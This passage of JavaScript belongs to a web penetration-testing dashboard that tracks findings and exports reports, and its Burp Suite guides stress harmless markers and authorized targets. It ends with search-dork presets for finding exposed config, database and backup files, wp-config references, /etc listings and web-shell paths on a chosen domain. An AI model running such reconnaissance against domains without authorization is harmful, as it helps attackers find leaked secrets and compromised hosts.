        data.findings[id].screenshots = [...(data.findings[id].screenshots || []), ...images];
        saveData(data);
        refreshView();
    });
}

function removeScreenshot(id, index) {
    const data = getSavedData();
    const screenshots = data.findings[id] && data.findings[id].screenshots;
    if (!screenshots) return;
    const validIndexes = screenshots
        .map((image, screenshotIndex) => ({ image, screenshotIndex }))
        .filter(entry => typeof entry.image === 'string' && /^data:image\/(png|jpeg|gif|webp);base64,/i.test(entry.image));
    const entry = validIndexes[index];
    if (!entry) return;
    screenshots.splice(entry.screenshotIndex, 1);
    saveData(data);
    refreshView();
}

function openScreenshot(id, index) {
    const screenshots = getSavedData().findings[id]?.screenshots || [];
    const image = screenshots[index];
    if (!image) return;
    document.getElementById('screenshotModalImage').src = image;
    document.getElementById('screenshotModal').classList.add('open');
}

function closeScreenshot(event) {
    if (event.target.id === 'screenshotModal' || event.target.id === 'screenshotModalImage') {
        document.getElementById('screenshotModal').classList.remove('open');
    }
}

function toggleCompleteCategory() {
    const data = getSavedData();
    const pageVal = document.getElementById('pageSelect') ? document.getElementById('pageSelect').value : 'all-pages';
    const pageName = pageVal && pageVal !== 'all-pages' ? decodeURIComponent(pageVal) : null;
    const selectedLocs = getSelectedLocations();

    const catItems = testCases.filter(i => {
        const matchesCat = !activeCategory || i.category === activeCategory;
        const matchesPage = !pageName || derivePageFromWhere(i.where) === pageName;
        const matchesLoc = !selectedLocs.length || (itemLocationMap[i.id] || []).some(l => selectedLocs.includes(l)) || selectedLocs.includes(norm(i.where));
        return matchesCat && matchesPage && matchesLoc;
    });

    const allCompleted = catItems.every(i => isCompletedStatus(data, i.id));
    catItems.forEach(i => {
        data.completed[i.id] = !allCompleted;
    });
    saveData(data);
    renderCategories();
    if (selectedLocs.length) onLocationToggle();
    else {
        const pageVal2 = document.getElementById('pageSelect').value;
        if (pageVal2 !== 'all-pages') showAllForPage(decodeURIComponent(pageVal2));
        else {
            renderCards([]);
            document.getElementById('resultsInfo').innerText = '';
        }
    }
}

function saveNote(id, value) {
    const data = getSavedData();
    data.notes[id] = value;
    data.stepToReproduce[id] = value;
    saveData(data);
}

function saveStepToReproduce(id, value) {
    const data = getSavedData();
    data.stepToReproduce[id] = value;
    data.notes[id] = value;
    saveData(data);
}

function copyText(button) {
    const text = decodeHtml(button.getAttribute('data-payload'));
    const copied = () => {
        const orig = button.innerText;
        button.innerText = "Copied!";
        button.style.background = "var(--success)";
        button.style.borderColor = "var(--success)";
        button.style.color = "#ffffff";
        setTimeout(() => {
            button.innerText = orig; button.style.background = ""; button.style.borderColor = ""; button.style.color = "";
        }, 1200);
    };
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).then(copied).catch(() => fallbackCopy(text, copied));
    } else {
        fallbackCopy(text, copied);
    }
}

function getValidationGuidance(item) {
    const category = norm(item.category);
    if (category.includes('rce') || category.includes('injection') || category.includes('deserialization')) return 'Use a harmless marker or fixed test value in an authorized lab. Confirm only timing, reflection, or a controlled callback; do not run commands or access real secrets.';
    if (category.includes('xss')) return 'Use a harmless canary such as plain text or a controlled alert in a lab. Verify output encoding and context without reading cookies or sending data away.';
    if (category.includes('upload')) return 'Use a non-executable test file with a unique marker. Confirm type, size, storage path, and download behavior without uploading a script.';
    if (category.includes('ssrf')) return 'Use an endpoint you own or a controlled callback domain. Confirm the server request and block private, loopback, and metadata destinations.';
    if (category.includes('business') || category.includes('race')) return 'Use a disposable test account and zero-value or reversible transactions. Stop before creating financial loss or changing real records.';
    return 'Use a disposable account, a harmless marker, and only authorized targets. Record the request, response status, relevant headers, and a redacted response.';
}

function getBurpSuiteGuide(item) {
    const category = norm(item.category);
    const title = norm(item.title);
    let focus = 'In Repeater, change one harmless parameter such as field=TEST-MARKER and compare it with the original request.';
    let note = 'Use only an authorized target and keep the request rate low.';
    let parameter = 'the input, query value, or JSON field used by this check';
    let interceptWhen = 'when the page or form sends its request';
    let linkHint = `the authorized ${item.where} URL`;

    if (category.includes('xss')) {
        focus = 'Send the request to Repeater, replace only the selected value with text such as comment=TEST-MARKER, and check the rendered output for safe encoding.';
        note = 'Do not use cookie-reading, external callback, or destructive script payloads.';
        parameter = 'comment, search, name, or another reflected input';
        interceptWhen = 'right after submitting the test input';
    } else if (category.includes('sqli')) {
        focus = 'Send the request to Repeater, compare a normal value with username=TEST-MARKER, and check only controlled status, error, and timing differences.';
        note = 'Do not dump data, alter records, use destructive statements, or run automated Intruder attacks.';
        parameter = 'username, id, q, or the parameter named in the finding';
        interceptWhen = 'when the search, login, or form request is submitted';
    } else if (category.includes('open redirect') || title.includes('redirect')) {
        focus = 'Send the navigation request to Repeater, replace the redirect destination with https://example.com, and check whether the server validates the destination.';
        note = 'Use a safe destination and do not redirect users to deceptive or harmful sites.';
        parameter = 'next, url, redirect, return, or destination';
        interceptWhen = 'when clicking the link or submitting the redirect form';
    } else if (category.includes('rate limiting') || title.includes('rate limit')) {
        focus = 'Send one request to Repeater, confirm the normal response, then use only the minimum authorized repeat count to inspect throttling headers and status changes.';
        note = 'Keep the rate low and stop as soon as throttling is confirmed.';
        parameter = 'the same login, OTP, search, or API request under test';
        interceptWhen = 'on the first normal request, before any limited repeat';
    } else if (category.includes('auth') || category.includes('session')) {
        focus = 'Capture the login or session request, send a copy to Repeater, and compare only disposable test-account requests.';
        note = 'Never use another person\'s session or real credentials.';
        parameter = 'username, password field, session cookie, or token';
        interceptWhen = 'when logging in, logging out, or changing a session setting';
    } else if (category.includes('idor') || category.includes('access')) {
        focus = 'Capture the request with Test Account A, send it to Repeater, and compare it with the same authorized request for Test Account B.';
        note = 'Use two accounts that you own and test only records created for the assessment.';
        parameter = 'id, user_id, order_id, document_id, or object reference';
        interceptWhen = 'when opening or updating the test record';
    } else if (category.includes('csrf')) {
        focus = 'Capture one harmless state-changing request in Repeater, remove or change the CSRF token in a test copy, and compare the server response.';
        note = 'Use a disposable record and do not trigger payments, deletion, or irreversible changes.';
        parameter = 'CSRF token and one reversible form field';
        interceptWhen = 'when submitting the disposable state-changing form';
    } else if (category.includes('ssrf')) {
        focus = 'Capture the URL-fetch request in Repeater and replace the URL with a unique callback address that you control.';
        note = 'Do not request loopback, cloud metadata, private-network, or third-party addresses.';
        parameter = 'url, uri, image, webhook, preview, or fetch parameter';
        interceptWhen = 'when the server-side fetch form or API request is sent';
    } else if (category.includes('upload')) {
        focus = 'Capture the multipart upload request, send it to Repeater, and change only the harmless filename or test-file metadata.';
        note = 'Use a non-executable file such as test-marker.txt.';
        parameter = 'multipart file field, filename, content type, and size';
        interceptWhen = 'while submitting the harmless test file';
    } else if (category.includes('cors')) {
        focus = 'Capture a safe API request in Repeater, change only the Origin header to an authorized test origin, and inspect Access-Control-Allow-Origin and credentials behavior.';
        note = 'Use a test origin you control and redact authorization headers.';
        parameter = 'Origin request header and CORS response headers';
        interceptWhen = 'when the browser sends the cross-origin API request';
    } else if (category.includes('api') || category.includes('graphql')) {
        focus = 'Capture the API request, send it to Repeater, and change one test parameter or header before comparing the response.';
        note = 'Redact tokens and do not replay destructive mutations.';
        parameter = 'JSON field, query parameter, GraphQL variable, or header';
        interceptWhen = 'when the API or GraphQL operation is submitted';
    } else if (category.includes('websocket')) {
        focus = 'Capture the WebSocket handshake and authorized message, then inspect one harmless message in the WebSocket history.';
        note = 'Use a disposable channel and avoid broadcast or state-changing messages.';
        parameter = 'WebSocket handshake headers or harmless message field';
        interceptWhen = 'when the WebSocket connects and sends its first test message';
    } else if (category.includes('prototype')) {
        focus = 'Capture the JSON request in Repeater and add only a harmless test property, then compare the response and any later test-only behavior.';
        note = 'Do not modify shared objects, permissions, or production configuration.';
        parameter = 'JSON object property accepted by the test endpoint';
        interceptWhen = 'when the JSON body is submitted';
    } else if (category.includes('path traversal')) {
        focus = 'Capture the authorized file-request parameter in Repeater and use a fixed test filename within the assessment fixture to verify path normalization.';
        note = 'Do not request operating-system files or secrets.';
        parameter = 'file, path, template, or download parameter';
        interceptWhen = 'when the test fixture file is requested';
    } else if (category.includes('information disclosure') || category.includes('security headers')) {
        focus = 'Capture the normal response in Repeater and inspect status, headers, redirects, comments, and redacted body content for unintended information.';
        note = 'Use passive comparison first and do not access exposed secrets.';
        parameter = 'response headers, public metadata, comments, or documented endpoint';
        interceptWhen = 'when the normal page or API response returns';
    } else if (category.includes('clickjacking')) {
        focus = 'Capture the page response in Repeater and inspect Content-Security-Policy and X-Frame-Options headers for frame protection.';
        note = 'Verify in a local test page only; do not frame a real user workflow.';
        parameter = 'Content-Security-Policy and X-Frame-Options response headers';
        interceptWhen = 'when the protected page loads';
    } else if (category.includes('rce') || category.includes('injection')) {
        focus = 'Capture the authorized request in Repeater and replace only the test value with a harmless marker, then inspect validation and response timing.';
        note = 'Do not execute commands, access files, or use destructive payloads.';
        parameter = 'the command-like or template input field under test';
        interceptWhen = 'when the authorized test form or API request is sent';
    } else if (category.includes('business') || category.includes('race')) {
        focus = 'Capture one disposable transaction request in Repeater and change only a zero-value or reversible test field before comparing the result.';
        note = 'Do not send concurrent or repeated requests against real transactions.';
        parameter = 'quantity, coupon, balance, workflow step, or test record field';
        interceptWhen = 'when the disposable transaction or workflow step is submitted';
    }

    return `<div class="burp-guide"><div class="burp-guide-title">Burp Suite: 4-step check</div><div class="burp-plan"><div><strong>Link:</strong> ${escapeHtml(linkHint)}</div><div><strong>Intercept when:</strong> ${escapeHtml(interceptWhen)}</div><div><strong>Parameter:</strong> ${escapeHtml(parameter)}</div></div><ol><li>Open Burp Suite, set the browser proxy, and visit the authorized ${escapeHtml(item.where)}.</li><li>Use Proxy &gt; HTTP history to find the request and send it to Repeater.</li><li>${escapeHtml(focus)}</li><li>Compare status, timing, headers, and a redacted response, then record: ${escapeHtml(item.expected)}. ${escapeHtml(note)}</li></ol></div>`;
}

function getReportSteps(item) {
    if (Array.isArray(item.steps) && item.steps.length > 0) {
        return item.steps;
    }

    const category = norm(item.category);
    let action = 'Enter a harmless marker, for example field=TEST-MARKER, and submit it once.';
    if (category.includes('xss')) action = 'Enter plain text such as comment=TEST-MARKER and check whether it is safely displayed.';
    if (category.includes('sqli') || category.includes('injection')) action = 'Test a normal value and a harmless marker such as username=TEST-MARKER, then compare the responses.';
    if (category.includes('auth') || category.includes('idor') || category.includes('csrf')) action = 'Use a disposable test account and change only a test value such as user_id=TEST-USER-ID.';
    if (category.includes('upload')) action = 'Upload a non-executable file named test-marker.txt and check its validation and access.';
    if (category.includes('ssrf')) action = 'Use only a callback URL you control, such as https://callback.example/unique-id.';
    if (category.includes('business') || category.includes('race')) action = 'Use a disposable test record and make one small, reversible change, such as quantity=1.';
    return [
        `Open the authorized ${item.where} on the test target.`,
        action,
        'Compare it with the normal result. Note only clear differences such as status, timing, reflection, or access.',
        'Write down the URL, parameter, result, and redacted evidence. Stop if the test could affect real data.'
    ];
}

function resetAllProgress() {
    if (confirm("Are you sure you want to reset all completion progress and notes?")) {
        localStorage.removeItem('thenawabx_sec_ops_data');
        activeCategory = null;
        summaryCompletionFilter = null;
        summarySeverityFilter = null;
        buildPageOptions(); document.getElementById('pageSelect').value = 'all-pages'; renderCategories();
        document.getElementById('searchInput').value = '';
        document.getElementById('statusFilter').value = 'all';
        document.getElementById('targetInput').value = '';
        document.getElementById('projectInput').value = '';
        document.getElementById('projectNotes').value = '';
        document.getElementById('locationContainer').innerHTML = '<div style="color:var(--text-sub); font-size:0.9rem;">Select a page first to see locations.</div>';
        document.getElementById('activeCategoryTitle').innerText = 'All Vulnerabilities';
        renderCards([]); document.getElementById('resultsInfo').innerText = '';
        updateSummary();
        updateProgressStats();
    }
}

function toggleTheme() {
    document.body.classList.toggle('dark-mode');
    const isDark = document.body.classList.contains('dark-mode');
    localStorage.setItem('thenawabx_theme', isDark ? 'dark' : 'light');
}

async function exportJSON() {
    const data = getSavedData();
    const content = JSON.stringify({ testCases: uniqueTestCases(), userProgress: data }, null, 2);
    if (window.showSaveFilePicker) {
        try {
            const handle = await window.showSaveFilePicker({
                suggestedName: 'thenawabx_dashboard.json',
                types: [{ description: 'JSON backup', accept: { 'application/json': ['.json'] } }]
            });
            const writable = await handle.createWritable();
            await writable.write(content);
            await writable.close();
            return;
        } catch (error) {
            if (error.name === 'AbortError') return;
        }
    }
    const blob = new Blob([content], { type: 'application/json;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = 'thenawabx_dashboard.json';
    document.body.appendChild(link);
    link.click();
    link.remove();
    URL.revokeObjectURL(url);
}

function importJSON() {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = '.json,application/json';
    input.onchange = event => {
        const file = event.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = () => {
            try {
                const imported = JSON.parse(reader.result);
                const incoming = imported.userProgress || imported;
                const restored = {
                    status: incoming.status || {},
                    completed: incoming.completed || {},
                    notes: incoming.notes || {},
                    stepToReproduce: incoming.stepToReproduce || incoming.notes || {},
                    findings: incoming.findings || {},
                    workspace: incoming.workspace || {}
                };
                localStorage.setItem('thenawabx_sec_ops_data', JSON.stringify(restored));
                loadWorkspace();
                refreshView();
            } catch (error) {
                alert('Invalid JSON backup file.');
            }
        };
        reader.readAsText(file);
    };
    input.click();
}

function exportMarkdown() {
    const data = getSavedData();
    const workspace = data.workspace || {};
    let md = `# thenawabx Security Operations Dashboard\n\nTarget: ${workspace.target || 'Not set'}\nProject: ${workspace.project || 'Not set'}\n\n${workspace.notes || ''}\n\n`;
    uniqueTestCases().forEach((item, i) => {
        const status = getCaseStatus(data, item.id);
        const finding = data.findings[item.id] || {};
        const note = data.notes[item.id] ? `\n\n**Step to Check:**\n${data.notes[item.id]}\n` : '';
        md += `### ${i+1}. ${item.title}\n`;
        md += `- **Category:** ${item.category}\n- **Severity:** ${item.severity}\n- **Where to test:** ${item.where}\n- **Status:** ${status}\n- **Affected URL:** ${finding.url || ''}\n- **Parameter:** ${finding.parameter || ''}\n- **Reference:** ${finding.reference || ''}\n- **Impact/Evidence:** ${finding.evidence || ''}\n- **Remediation/Retest:** ${finding.remediation || ''}\n`;
        md += `**Steps to Check:**\n${getReportSteps(item).map((s, idx) => `  ${idx+1}. ${s}`).join('\n')}\n`;
        md += `**Payloads:**\n${item.payloads.map(p => `  - \`${p}\``).join('\n')}\n`;
        md += `**Expected Result:** ${item.expected}\n${note}\n`;
    });
    downloadFile(md, 'text/markdown', 'thenawabx_dashboard.md');
}

function exportCSV() {
    const data = getSavedData();
    let csv = "ID,Category,Title,Severity,Location,Status,Affected URL,Parameter,Reference,Impact/Evidence,Remediation,Expected Result,Note\n";
    uniqueTestCases().forEach(item => {
        let title = `"${item.title.replace(/"/g,'""')}"`;
        let expected = `"${item.expected.replace(/"/g,'""')}"`;
        const finding = data.findings[item.id] || {};
        let status = getCaseStatus(data, item.id);
        let url = `"${(finding.url || '').replace(/"/g,'""')}"`;
        let parameter = `"${(finding.parameter || '').replace(/"/g,'""')}"`;
        let evidence = `"${(finding.evidence || '').replace(/"/g,'""')}"`;
        let remediation = `"${(finding.remediation || '').replace(/"/g,'""')}"`;
        let note = data.notes[item.id] ? `"${data.notes[item.id].replace(/"/g,'""')}"` : '""';
        let reference = `"${(finding.reference || '').replace(/"/g,'""')}"`;
        csv += `${item.id},${item.category},${title},${item.severity},"${item.where}",${status},${url},${parameter},${reference},${evidence},${remediation},${expected},${note}\n`;
    });
    downloadFile(csv, 'text/csv', 'thenawabx_dashboard.csv');
}

function buildReportHTML() {
    const data = getSavedData();
    const workspace = data.workspace || {};
    const reportCases = uniqueTestCases().filter(item => {
        return getCaseStatus(data, item.id) === 'Vulnerable';
    });
    const cards = reportCases.map((item, index) => {
        const finding = data.findings[item.id] || {};
        const screenshots = getSafeScreenshots(finding);
        const screenshotsHtml = screenshots.length
            ? `<h3>Screenshots</h3><div class="report-screenshots">${screenshots.map(image => `<img src="${escapeHtml(image)}" alt="Finding screenshot">`).join('')}</div>`
            : '';
        const customSteps = getStepToReproduce(data, item.id);
        return `<article><h2>${index + 1}. ${escapeHtml(item.title)}</h2><p><b>Category:</b> ${escapeHtml(item.category)} | <b>Severity:</b> ${escapeHtml(item.severity)} | <b>Status:</b> Vulnerable</p><p><b>Location:</b> ${escapeHtml(item.where)}</p><p><b>Affected URL:</b> ${escapeHtml(finding.url || 'Not recorded')}<br><b>Parameter / endpoint:</b> ${escapeHtml(finding.parameter || 'Not recorded')}<br><b>Reference:</b> ${escapeHtml(finding.reference || 'Not recorded')}</p><h3>Steps to Check</h3><ol>${getReportSteps(item).map(step => `<li>${escapeHtml(step)}</li>`).join('')}</ol>${customSteps ? `<h3>Observed Check Notes</h3><p class="report-notes">${escapeHtml(customSteps)}</p>` : ''}<p><b>Expected Result:</b> ${escapeHtml(item.expected)}</p><p><b>Impact / Evidence:</b> ${escapeHtml(finding.evidence || 'Not recorded')}</p><p><b>Remediation / Retest:</b> ${escapeHtml(finding.remediation || 'Not recorded')}</p>${screenshotsHtml}</article>`;
    }).join('');
    const empty = '<p>No test case is currently marked Vulnerable.</p>';
    return `<!doctype html><html><head><meta charset="utf-8"><title>${escapeHtml(workspace.project || 'Security Report')}</title><style>body{font:14px Arial;max-width:900px;margin:30px auto;color:#111}article{border-bottom:1px solid #ccc;padding:12px 0}h1{color:#172554}h2{font-size:18px}.report-actions{position:sticky;top:0;padding:12px 0;background:#fff}.report-notes{white-space:pre-wrap;line-height:1.6}.report-screenshots{display:flex;flex-wrap:wrap;gap:8px}.report-screenshots img{width:68px;height:46px;object-fit:cover;cursor:zoom-in}.report-screenshots img.report-image-large{width:auto;height:auto;max-width:95vw;max-height:80vh;object-fit:contain}@media print{.report-actions{display:none}.report-screenshots img{width:68px;height:46px}}</style></head><body><div class="report-actions"><button onclick="window.print()">Print / Save PDF</button></div><h1>Security Assessment Report</h1><p><b>Target:</b> ${escapeHtml(workspace.target || 'Not set')}<br><b>Project:</b> ${escapeHtml(workspace.project || 'Not set')}</p><p class="report-notes">${escapeHtml(workspace.notes || '')}</p>${cards || empty}</body></html>`;
}

function exportHTML() {
    downloadFile(buildReportHTML(), 'text/html', 'thenawabx_security_report.html');
}

function exportPDF() {
    const report = window.open('', '_blank');
    if (!report) return;
    report.document.write(buildReportHTML());
    report.document.close();
}

function escapeHtml(text) {
    return text.toString()
        .replace(/&/g,"&amp;")
        .replace(/</g,"&lt;")
        .replace(/>/g,"&gt;")
        .replace(/"/g,"&quot;")
        .replace(/'/g,"&#039;");
}

function updateProgressStats() {
    const data = getSavedData();
    const total = testCases.length;
    const completed = Object.keys(data.completed).filter(k => data.completed[k] === true).length;
    const totalPercent = total>0 ? Math.round((completed/total)*100) : 0;
    document.getElementById('progressBar').style.width = `${totalPercent}%`;
    document.getElementById('progressText').innerText = `Total Progress: ${totalPercent}% Completed`;
    document.getElementById('progressCount').innerText = `${completed}/${total}`;

    const pageVal = document.getElementById('pageSelect') ? document.getElementById('pageSelect').value : 'all-pages';
    const pageName = pageVal && pageVal !== 'all-pages' ? decodeURIComponent(pageVal) : null;
    const selectedLocs = getSelectedLocations();

    const catItems = testCases.filter(i => {
        const matchesCat = !activeCategory || i.category === activeCategory;
        return matchesCat && matchesSelection(i, pageName, selectedLocs);
    });
    const catCompleted = catItems.filter(i => isCompletedStatus(data, i.id)).length;
    const catPercent = catItems.length > 0 ? Math.round((catCompleted / catItems.length) * 100) : 0;
    document.getElementById('catProgressText').innerText = `${activeCategory || 'All'} Progress: ${catPercent}% (${catCompleted}/${catItems.length})`;
}

function updateSummary() {
    const data = getSavedData();
    const filters = getCurrentFilters();
    const scope = testCases.filter(item => matchesSelection(item, filters.pageName, filters.selectedLocs));
    const visible = scope.filter(item => {
        const haystack = norm([item.category, item.title, item.where, item.expected, ...item.steps, ...item.payloads].join(' '));
        return (!filters.search || haystack.includes(filters.search)) && (filters.severity === 'all' || item.severity === filters.severity) && (!filters.notesOnly || hasSavedNote(data, item.id));
    });
    const done = visible.filter(item => isCompletedStatus(data, item.id)).length;
    const pageDone = scope.filter(item => isCompletedStatus(data, item.id)).length;
    const items = [
        ['Total', visible.length, 'total'],
        ['Critical', visible.filter(item => item.severity === 'Critical').length, 'severity:Critical'],
        ['High', visible.filter(item => item.severity === 'High').length, 'severity:High'],
        ['Medium', visible.filter(item => item.severity === 'Medium').length, 'severity:Medium'],
        ['Low', visible.filter(item => item.severity === 'Low').length, 'severity:Low'],
        ['Completed', done, 'completed'],
        ['Pending', visible.length - done, 'pending'],
        ['Page Progress', `${pageDone}/${scope.length}`, 'page']
    ];
    document.getElementById('summaryGrid').innerHTML = items.map(item => `<button type="button" class="summary-item" title="Filter by ${item[0]}" onclick="applySummaryFilter('${item[2]}')"><strong>${item[1]}</strong>${item[0]}</button>`).join('');
}

function applySummaryFilter(filter) {
    summaryCompletionFilter = null;
    summarySeverityFilter = null;
    document.getElementById('statusFilter').value = 'all';
    if (filter === 'total' || filter === 'page') {
        summarySeverityFilter = null;
    } else if (filter === 'completed' || filter === 'pending') {
        summaryCompletionFilter = filter;
    } else if (filter.startsWith('severity:')) {
        summarySeverityFilter = filter.split(':')[1];
    }
    refreshView();
}

function decodeHtml(text) {
    const textarea = document.createElement('textarea');
    textarea.innerHTML = text || '';
    return textarea.value;
}

function uniqueTestCases() {
    const seen = new Set();
    return testCases.filter(item => {
        const key = `${norm(item.id)}|${norm(item.title)}`;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
    });
}

function downloadFile(content, type, filename) {
    const blob = new Blob([content], { type: `${type};charset=utf-8` });
    const link = document.createElement('a');
    const url = URL.createObjectURL(blob);
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    link.remove();
    URL.revokeObjectURL(url);
}

const dorkingPresets = [
    ['Directory listings', 'Files', 'intitle:index.of'],
    ['Configuration files', 'Files', 'ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini'],
    ['Database files', 'Files', 'ext:sql | ext:dbf | ext:mdb'],
    ['Log files', 'Files', 'ext:log'],
    ['Backup and old files', 'Files', 'ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup'],
    ['Login pages', 'Authentication', 'inurl:login'],
    ['SQL error pages', 'Errors', 'intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command"'],
    ['Public documents', 'Documents', 'ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv'],
    ['PHP info pages', 'Technology', 'ext:php intitle:phpinfo "published by the PHP Group"'],
    ['WordPress paths', 'Technology', 'inurl:wp- | inurl:wp-content | inurl:plugins | inurl:uploads | inurl:themes | inurl:download'],
    ['Backdoor indicators', 'Sensitive', 'inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd'],
    ['Install and setup files', 'Files', 'inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config'],
    ['Open redirect parameters', 'Input points', 'inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http'],
    ['Apache Struts endpoints', 'Technology', 'ext:action | ext:struts | ext:do'],
    ['Pastebin entries', 'External', 'site:pastebin.com ${domain}'],
    ['LinkedIn employees', 'External', 'site:linkedin.com employees ${domain}'],
    ['Sensitive web files', 'Sensitive', 'inurl:"/phpinfo.php" | inurl:"/.htaccess" | inurl:"/.git" -github ${domain}'],
    ['Subdomains', 'Discovery', 'site:*.${domain}'],
    ['Sub-subdomains', 'Discovery', 'site:*.*.${domain}'],
    ['WordPress paths 2', 'Technology', 'inurl:wp-content | inurl:wp-includes ${domain}'],
    ['GitHub host search', 'External', '"*.${domain}"', 'https://github.com/search?q=${query}&type=host'],
    ['Crossdomain policy', 'Configuration', 'crossdomain.xml'],
    ['ThreatCrowd lookup', 'External', '', 'https://threatcrowd.org/domain.php?domain=${domain}'],
    ['SWF files', 'Files', 'inurl:${domain} ext:swf'],
    ['MIME SWF files', 'Files', 'site:${domain} mime:swf', 'https://yandex.com/search/?text=${query}'],
    ['Historical SWF links', 'Archives', '', 'https://web.archive.org/cdx/search?url=${domain}/&matchType=domain&collapse=urlkey&output=text&fl=original&filter=urlkey:.*swf&limit=100000'],
    ['Historical MIME SWF links', 'Archives', '', 'https://web.archive.org/cdx/search?url=${domain}/&matchType=domain&collapse=urlkey&output=text&fl=original&filter=mimetype:application/x-shockwave-flash&limit=100000'],
    ['Web Archive URLs', 'Archives', '', 'https://web.archive.org/web/*/${domain}/*'],
    ['Web Archive host search', 'Archives', '', 'https://web.archive.org/web/*/(.${domain})'],
    ['Certificate transparency', 'Discovery', '', 'https://crt.sh/?q=%25.${domain}'],
    ['OpenBugBounty lookup', 'External', '', 'https://www.openbugbounty.org/search/?search=${domain}&type=host'],
    ['Reddit mentions', 'External', '', 'https://www.reddit.com/search/?q=${domain}&source=recent'],
    ['WordPress config backups', 'Sensitive', '+inurl:${domain} +ext:wp- | +inurl:${domain} +ext:wp-content'],
    ['Censys IPv4', 'External', '', 'https://search.censys.io/hosts?q=${domain}'],
    ['Censys domain', 'External', '', 'https://search.censys.io/search?resource=hosts&q=${domain}'],
    ['Censys certificates', 'External', '', 'https://search.censys.io/search?resource=certificates&q=${domain}'],
    ['Shodan lookup', 'External', '', 'https://www.shodan.io/search?query=${domain}'],
    ['Vulnerable server indicators', 'Technology', 'inurl:"/geoserver/ows?service=wfs"'],
    ['ArcGIS REST directory', 'Technology', 'intext:"ArcGIS REST Services Directory" intitle:"Folder: /"'],
    ['WP PDF uploads', 'WordPress', 'inurl:/wp-content/uploads/wpo_wcpdf'],
    ['main.yml files', 'Configuration', 'intitle:"index of main.yml"'],
    ['Admin portals', 'Authentication', 'inurl:/admin.aspx'],
    ['Image upload endpoints', 'Input points', 'inurl:uploadimage.php'],
    ['Contact Form 7 paths', 'WordPress', 'inurl:*/wp-content/plugins/contact-form-7/'],
    ['conf.php files', 'Configuration', 'intitle:index.of conf.php'],
    ['Sharing API info', 'API', 'intitle:"Sharing API Info"'],
    ['Admin backup archives', 'Sensitive', 'intitle:"Index of" inurl:/backup/ "admin.zip"'],
    ['GitHub API references', 'External', 'intitle:"index of" github-api'],
    ['WooCommerce uploads', 'WordPress', 'inurl:wp-content/uploads/wcpa_uploads'],
    ['Drupal login pages', 'Technology', 'inurl:user intitle:"Drupal" intext:"Log in" -"powered by"'],
    ['Joomla database paths', 'Technology', 'inurl:/libraries/joomla/database/'],
    ['SQL file endpoints', 'Input points', 'inurl:"php?sql=select" ext:php'],
    ['WordPress config references', 'WordPress', 'inurl:"wp-content" intitle:"index.of" intext:wp-config.php'],
    ['JSON-RPC endpoints', 'API', 'intext:"index of" inurl:json-rpc'],
    ['Download file parameters', 'Input points', 'intitle:"index of" "download.php?file="'],
    ['JWKS-RSA files', 'Authentication', 'intext:"index of" inurl:jwks-rsa'],
    ['WordPress backups', 'WordPress', 'inurl:"wp-content" intitle:"index.of" intext:backup'],
    ['MySQL configuration files', 'Configuration', 'intitle:index.of conf.mysql'],
    ['YAML environment files', 'Configuration', 'intitle:"index of" "users.yml" | "admin.yml" | "config.yml"'],
    ['Docker Compose files', 'Configuration', 'intitle:"index of" "docker-compose.yml"'],
    ['Maven pom.xml files', 'Configuration', 'intext:pom.xml intitle:"index of /"'],
    ['Exposed etc directories', 'Sensitive', 'intext:"Index of" intext:"/etc"'],
    ['SQL directory listings', 'Databases', '"sql" "parent" intitle:index.of -injection']
].map(([title, category, query, url]) => ({ title, category, query, url }));

function normalizeDorkingTarget(value) {
    let target = String(value || '').trim().toLowerCase();
    target = target.replace(/^[a-z]+:\/\//i, '').split('/')[0].split('?')[0].split('#')[0];
    target = target.replace(/:\d+$/, '').replace(/\.$/, '');
    if (!/^(?=.{1,253}$)([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/i.test(target)) return '';
    return target;
}

function dorkingUrl(preset, target) {
    const query = preset.query.replace(/\$\{domain\}/g, target);
    if (preset.url) return preset.url.replace(/\$\{domain\}/g, encodeURIComponent(target)).replace(/\$\{query\}/g, encodeURIComponent(query));
    const alreadyScoped = query.includes('site:') || query.includes(`inurl:${target}`) || query.includes(`inurl:+${target}`);
    const searchQuery = alreadyScoped ? query : `site:${target} ${query}`.trim();
    return `https://www.google.com/search?q=${encodeURIComponent(searchQuery)}`;
}

function openDorkingModal() {
    const category = document.getElementById('dorkingCategory');
    if (!category.options.length || category.options.length === 1) {
        [...new Set(dorkingPresets.map(preset => preset.category))].sort().forEach(value => {
            category.insertAdjacentHTML('beforeend', `<option value="${escapeHtml(value)}">${escapeHtml(value)}</option>`);
        });
    }
    document.getElementById('dorkingModal').classList.add('open');
    document.getElementById('dorkingTarget').focus();
    renderDorkingPresets();
}

function closeDorkingModal(event) {
    if (!event || event.target.id === 'dorkingModal') document.getElementById('dorkingModal').classList.remove('open');
}

function handleDorkingEnter(event) {
    if (event.key === 'Enter') {
        event.preventDefault();
        const first = document.querySelector('.dork-open-button');
        if (first) first.click();
    }
}

function filterDorkingPresets() {
    renderDorkingPresets();
}

function getVisibleDorkingPresets() {
    const category = document.getElementById('dorkingCategory').value;
    return dorkingPresets.filter(preset => !category || category === 'all' || preset.category === category);
}

function renderDorkingPresets() {
    const container = document.getElementById('dorkingList');
    const search = norm(document.getElementById('dorkingTarget').value);
    const filtered = getVisibleDorkingPresets();
    container.innerHTML = filtered.map((preset, index) => {
        const target = normalizeDorkingTarget(search);
        const query = preset.query ? `site:${target || 'example.com'} ${preset.query.replace(/\$\{domain\}/g, target || 'example.com')}`.trim() : 'External lookup';
